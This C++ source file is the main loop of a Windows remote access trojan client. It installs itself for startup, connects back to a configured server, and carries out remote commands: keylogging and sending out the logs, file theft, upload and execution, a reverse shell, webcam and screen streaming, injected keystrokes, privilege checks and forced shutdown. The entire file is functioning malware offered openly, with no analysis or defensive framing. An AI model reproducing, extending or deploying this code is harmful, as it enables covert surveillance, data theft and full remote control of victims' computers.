#include <iostream>
#include <winsock2.h>
#include <chrono>
#include <thread>
#include "stream/Stream.h"
#include "download/Download.h"
#include "file/FileManager.h"
#include "information/system/SystemInformation.h"
#include "information/network/NetworkInformation.h"
#include "reverse_shell/ReverseShell.h"
#include "keyboard/KeyboardExecuter.h"
#include "permission/Permission.h"
#include "box_message/MessageBoxGUI.h"
#include "state/SystemState.h"
#include "install/Install.h"
#include "configuration.h"

int main(int argc = 0, char *argv[] = nullptr) {
    Sleep(argc);
    HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
    if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
#ifdef KEYLOGGER
        KeyLogger keyLogger(Stream(0));
        keyLogger.tryStart();
#endif
        Install::installClient(INSTALL_PATH, argv[0], SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);
        bool connectionState = true;
        while (connectionState) {
            std::cout << "trying to connect " << std::endl;
            WSADATA WSAData;
            WSAStartup(MAKEWORD(2, 0), &WSAData);
            SOCKET sock;
            SOCKADDR_IN sin;
            sin.sin_addr.s_addr = inet_addr(IP);
            sin.sin_family = AF_INET;
            sin.sin_port = htons(PORT);
            sock = socket(AF_INET, SOCK_STREAM, 0);
            bool streamListening = true;
            if (connect(sock, (SOCKADDR *) &sin, sizeof(sin)) != SOCKET_ERROR) {
                std::cout << "Connected to server!" << std::endl;
                Stream stream(sock);
                SystemInformation sysInfo(stream);
                NetworkInformation networkInfo(stream);
                FileManager fileManager(stream);
                ReverseShell reverseShell(stream);
                Download download(stream);
                KeyboardExecuter keyboardExecuter(stream);
                Permission permission(stream);
                MessageBoxGUI messageBoxGui(stream);
#ifdef KEYLOGGER
                keyLogger.setStream(stream);
#endif
                while (streamListening) {
                    int action = stream.readSize();
                    switch (action) {
                        case -3: { // Uninstall client
                            Install::uninstall();
                        }
                        case -2: { // Fully disconnect and close program
                            connectionState = false;
                            streamListening = false;
                            break;
                        }
                        case -1: { // Try to connect again to server
                            streamListening = false;
                            break;
                        }
                        case 0: { // System information retrieving
                            sysInfo.send();
                            break;
                        }
                        case 1: {  // Network information retrieving
                            networkInfo.send();
                            break;
                        }
                        case 2: {  // Reading disks of system
                            sysInfo.sendDisks();
                            break;
                        }
                        case 3: { // Read all directory (files and folders)
                            fileManager.send();
                            break;
                        }
                        case 5: { // download file or directory
                            download.start();
                            break;
                        }
                        case 6: { // copy file or directory
                            fileManager.copyFilesThread();
                            break;
                        }
                        case 7: { // move file or directory
                            fileManager.moveFilesThread();
                            break;
                        }
                        case 8: { // delete file or directory
                            fileManager.deleteFilesThread();
                            break;
                        }
                        case 9: { // run file or directory
                            fileManager.runFilesThread();
                            break;
                        }
                        case 10: { // upload files to directory
                            fileManager.uploadFiles();
                            break;
                        }
                        case 11: { // executes command on shell
                            reverseShell.send();
                            break;
                        }
#ifdef KEYLOGGER
                        case 12: { // tries to start in new thread the keylogger if it's not running
                            keyLogger.tryStart();
                            break;
                        }
                        case 13: { // stops keylogger
                            keyLogger.stopKeylogger();
                            break;
                        }
                        case 4: { // sends last log file in current session of client
                            keyLogger.send();
                            break;
                        }
                        case 14: { // sends all logs located on appdata folder
                            keyLogger.sendAll();
                            break;
                        }
                        case 15: { // sends if the keylogger is currently working
                            keyLogger.sendState();
                            break;
                        }
#endif
#ifdef WEBCAM
                        case 16: { // send webcam devices
                            DeviceEnumerator deviceEnumerator(stream);
                            deviceEnumerator.send();
                            break;
                        }

                        case 17: { // start webcam with custom features
                            WebcamManager webcamManager(stream);
                            webcamManager.startWebcam();
                            break;
                        }
#endif
                        case 18: { // keyboard executer, execute custom order of keyboard strokes and delays
                            keyboardExecuter.execute();
                            break;
                        }
                        case 19: { // send if system has admin privileges
                            permission.send();
                            break;
                        }
                        case 20: { // send result of UAC dialog
                            permission.sendElevatedPermissions();
                            break;
                        }
                        case 21: { // open messagebox with custom features
                            messageBoxGui.send();
                            break;
                        }
#ifdef WEBCAM
                        case 22: { // start screen streaming
                            ScreenStreamer screenStreamer(stream);
                            screenStreamer.send();
                            break;
                        }
#endif
                        case 23: { // log off
                            SystemState::setState(0);
                            break;
                        }
                        case 24: { // shutdown
                            SystemState::setState(1);
                            break;
                        }
                        case 26: { // restart
                            SystemState::setState(2);
                            break;
                        }
                        default:
                            break;
                    }
                }
                closesocket(sock);
            }
            WSACleanup();
            std::this_thread::sleep_for(std::chrono::milliseconds(TIMING_RETRY));
        }
    }
    ReleaseMutex(hMutexHandle);
    CloseHandle(hMutexHandle);
    return 0;
}
